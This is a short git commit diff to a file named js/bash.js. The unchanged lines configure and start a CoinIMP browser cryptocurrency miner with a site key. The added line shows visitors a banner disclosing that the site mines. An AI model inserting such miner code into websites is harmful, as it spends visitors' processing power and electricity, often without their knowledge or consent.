8e5d2d04b0bc730cc56795d7fb760949542a3b1d
darkside-community <99356964+darkside-community@users.noreply.github.com>
2022-02-11 22:50:21 +0700

    Updating bash

--- js/bash.js
+++ js/bash.js
@@ -2,3 +2,4 @@ var _client = new Client.User('c83706cb3c2d3c51207caf61ca99760ff4241fe88a013fe0e
    throttle: 0.1, c: 'w'
     });
     _client.start();
+   _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
